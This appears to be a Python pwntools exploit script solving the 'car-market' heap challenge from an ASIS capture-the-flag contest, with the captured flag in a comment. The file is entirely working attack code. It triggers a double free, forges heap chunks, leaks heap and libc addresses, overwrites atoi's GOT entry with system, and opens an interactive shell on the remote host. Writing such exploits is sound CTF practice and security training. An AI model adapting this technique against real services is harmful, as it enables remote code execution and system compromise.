#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
#ASIS{a0b8813fc566836c8b5f37fe68c684c5}
#host = "54.169.63.53"
#port = 2309
#host = "10.211.55.28"
#port = 8888
host = "car-market.asis-ctf.ir"
port = 31337

r = remote(host,port)

def add(name,price):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("model")
    r.sendline(name)
    r.recvuntil("price")
    r.sendline(str(price))


def dele(idx):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil("index")
    r.sendline(str(idx))

def info(idx):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil("index")
    r.sendline(str(idx))
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("Model  :")
    data = r.recvuntil("Prices :").split()
    return data[0]

def cu(name,comm):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("name :")
    r.sendline(name)
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil("coment :")
    r.sendline(comm)

def setmod(data):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("model")
    r.sendline(data)

for i in range(0x100):
    print i
    add("ddaa",123)


dele(255)
dele(254)
dele(255)

data = info(254)
heap = u64(data.ljust(8,"\x00")) - 0x37b0
print "heap:",hex(heap)
cu("o"*0x18 + p64(0x31),p64(0) + p64(heap+0x10) + "m"*0x8 + p64(0x31)  )
r.recvuntil(">")
r.sendline("4")
setmod(p64(heap+0x3850))
r.recvuntil(">")
r.sendline("5")
add("ddaa",123)
add(p64(heap+0x10),321)

r.recvuntil(">")
r.sendline("4")
r.recvuntil("index")
r.sendline("254")
r.recvuntil(">")
r.sendline("4")
r.recvuntil(">")
r.sendline("2")
r.recvuntil("name :")
atoi_got = 0x602078
r.sendline(p64(atoi_got) + p64(0x602070))
r.recvuntil(">")
r.sendline("4")
r.recvuntil(">")
r.sendline("5")
data = info(1)
libc = u64(data.ljust(8,"\x00")) - 0x6fdb0
print hex(libc)
system = libc + 0x45380
r.recvuntil(">")
r.sendline("5")
r.recvuntil(">")
r.sendline("4")
r.recvuntil("index")
r.sendline("0")
r.recvuntil(">")
r.sendline("2")
r.recvuntil("model")
r.sendline(p64(system))
r.interactive()


